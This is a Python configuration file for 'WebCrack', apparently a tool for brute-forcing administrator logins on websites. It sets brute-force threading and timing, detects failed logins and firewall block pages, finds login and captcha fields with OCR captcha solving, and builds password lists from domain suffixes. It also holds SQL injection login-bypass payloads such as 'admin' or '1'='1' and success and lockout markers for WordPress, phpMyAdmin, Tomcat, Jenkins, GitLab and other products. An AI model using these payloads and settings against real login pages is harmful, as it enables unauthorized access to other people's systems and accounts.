#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Configuration module for WebCrack
Handles loading and management of all configuration parameters
"""

import os
from pathlib import Path


def txt2list(filename):
    """
    Load lines from a text file into a list
    
    Args:
        filename (str): Name of the file to load
        
    Returns:
        list: List of lines from the file
    """
    ret = []
    # Get the directory where this file is located
    current_dir = Path(__file__).parent
    # First try to look in conf directory
    file_path = current_dir.parent.parent / 'conf' / filename
    
    # If file doesn't exist in conf directory, look in main directory
    if not file_path.exists():
        file_path = current_dir.parent.parent / filename
    
    try:
        if file_path.exists():
            with open(file_path, "r", encoding="UTF-8") as f:
                for line in f.readlines():
                    ret.append(line.strip())
        else:
            print(f"Warning: File {file_path} does not exist")
    except Exception as e:
        print(f"Error reading file {file_path}: {str(e)}")
    
    return ret


def load_config():
    """
    Load all configuration parameters
    
    Returns:
        dict: Configuration dictionary
    """
    config = {
        "log": {
            "log_filename": "logs.txt",
            "success_filename": "success.txt"
        },
        
        "brute_force": {
            "timeout": 10,
            "delay": 0.03,
            "test_username": "admin",
            "test_password": "length_test",
            "requests_proxies": {},
            "max_workers": 10,  # 添加多线程工作数配置
            "batch_max_workers": 1,  # 添加批量处理多线程工作数配置
            "fail_words": [
                '密码错误', '重试', '不正确', '密码有误', '不成功', '重新输入', '不存在', 
                '登录失败', '登陆失败', '密码或安全问题错误', 'history.go', 'history.back',
                '已被锁定', '安全拦截', '还可以尝试', '无效', '攻击行为', '创宇盾', 
                'http://zhuji.360.cn/guard/firewall/stopattack.html', 'D盾_拦截提示', 
                '用户不存在', '非法', '百度云加速', '安全威胁', '防火墙', '黑客', '不合法', 
                'Denied', '尝试次数', 'http://safe.webscan.360.cn/stopattack.html', 
                "Illegal operation", "服务器安全狗防护验证页面", "Login failed", "Invalid",
                "Access Denied", "Authentication failed", "Incorrect password",
                "User not found", "Sign in failed", "Log in failed", "Error",
                "Warning", "禁止访问", "认证失败", "账号或密码错误"
            ]
        },
        
        "captcha": {
            "enabled": True,
            "ocr_enabled": True,
            "captcha_input_name": "captcha",
            "captcha_img_name": "captcha_img"
        },
        
        "dictionary": {
            "base": {
                "username_list": ['admin'],
                "password_list": txt2list("password_list.txt")
            },
            
            "file": {
                "enabled": True,
                "username_file": "username.txt",
                "password_file": "password.txt"
            },
            
            "domain": {
                "enabled": True,
                "suffix_list": ["", "123", "666", "888", "123456"]
            },
            
            "sql_injection": {
                "enabled": True,
                "payload_list": [
                    "admin' or 'a'='a",
                    "'or'='or'",
                    "admin' or '1'='1' or 1=1",
                    "')or('a'='a",
                    "'or 1=1 -- -"
                ]
            }
        },
        
        "headers": {
            "enabled": True,
            "user_agents": txt2list("ua.txt"),  # 从ua.txt文件加载User-Agent列表
            
            "default_headers": {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'User-Agent': "WebCrack Test",
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.8',
                "Referer": "http://www.baidu.com/",
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        },
        
        "parser": {
            "default_value": "0000",
            "username_keywords": ["user", "name", "zhanghao", "yonghu", "email", "account"],
            "password_keywords": ["pass", "pw", "mima"],
            "captcha_keywords": [
                "验证码", "captcha", "验 证 码", "点击更换", "点击刷新", 
                "看不清", "认证码", "安全问题"
            ],
            "login_keywords": [
                "用户名", "密码", "login", "denglu", "登录", "user", 
                "pass", "yonghu", "mima", "admin"
            ],
            "captcha_img_keywords": [
                "captcha", "codeimg", "checkcode", "verify", "验证码", 
                "安全验证", "认证码", "校验码"
            ]
        },
        
        "cms": {
            "discuz": {
                "name": "discuz",
                "keywords": "admin_questionid",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "admin.php?action=logout",
                "die_flag": "密码错误次数过多",
                "alert": 0,
                "note": "discuz论坛测试"
            },
            "dedecms": {
                "name": "dedecms",
                "keywords": "newdedecms",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "",
                "die_flag": "",
                "alert": 0,
                "note": "dedecms测试"
            },
            "phpweb": {
                "name": "phpweb",
                "keywords": "width:100%;height:100%;background:#ffffff;padding:160px",
                "captcha": 0,
                "sqlin_able": 1,
                "success_flag": "admin.php?action=logout",
                "die_flag": "",
                "alert": 1,
                "note": "存在 phpweb 万能密码 : admin' or '1' ='1' or '1'='1"
            },
            "ecshop": {
                "name": "ecshop",
                "keywords": "validator.required('username', user_name_empty);",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "ECSCP[admin_pass]",
                "die_flag": "",
                "alert": 0,
                "note": "ecshop测试"
            },
            "phpmyadmin": {
                "name": "phpmyadmin",
                "keywords": "pma_username",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "db_structure.php",
                "die_flag": "",
                "alert": 0,
                "note": "phpmyadmin测试"
            },
            "wordpress": {
                "name": "wordpress",
                "keywords": "wp-login.php",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "wp-admin",
                "die_flag": "login_error",
                "alert": 0,
                "note": "WordPress测试"
            },
            "joomla": {
                "name": "joomla",
                "keywords": "Joomla!",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "task=login",
                "die_flag": "alert-error",
                "alert": 0,
                "note": "Joomla测试"
            },
            "drupal": {
                "name": "drupal",
                "keywords": "Drupal",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "user/logout",
                "die_flag": "Unrecognized username or password",
                "alert": 0,
                "note": "Drupal测试"
            },
            "tomcat": {
                "name": "tomcat",
                "keywords": "Tomcat",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "Tomcat Web Application Manager",
                "die_flag": "401 Unauthorized",
                "alert": 0,
                "note": "Tomcat Manager测试"
            },
            "weblogic": {
                "name": "weblogic",
                "keywords": "Hypertext Transfer Protocol",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "Welcome to WebLogic Application Server",
                "die_flag": "Authentication Failed",
                "alert": 0,
                "note": "WebLogic测试"
            },
            "jboss": {
                "name": "jboss",
                "keywords": "JBoss",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "JBoss Management Console",
                "die_flag": "401 Unauthorized",
                "alert": 0,
                "note": "JBoss测试"
            },
            "jenkins": {
                "name": "jenkins",
                "keywords": "Jenkins",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "href=\"/logout\"",
                "die_flag": "Invalid username or password",
                "alert": 0,
                "note": "Jenkins测试"
            },
            "gitlab": {
                "name": "gitlab",
                "keywords": "GitLab",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "href=\"/users/sign_out\"",
                "die_flag": "Invalid Login or password",
                "alert": 0,
                "note": "GitLab测试"
            },
            "zabbix": {
                "name": "zabbix",
                "keywords": "Zabbix",
                "captcha": 0,
                "sqlin_able": 0,
                "success_flag": "href=\"index.php?reconnect=1\"",
                "die_flag": "Incorrect user name or password",
                "alert": 0,
                "note": "Zabbix测试"
            }
        }
    }
    
    return config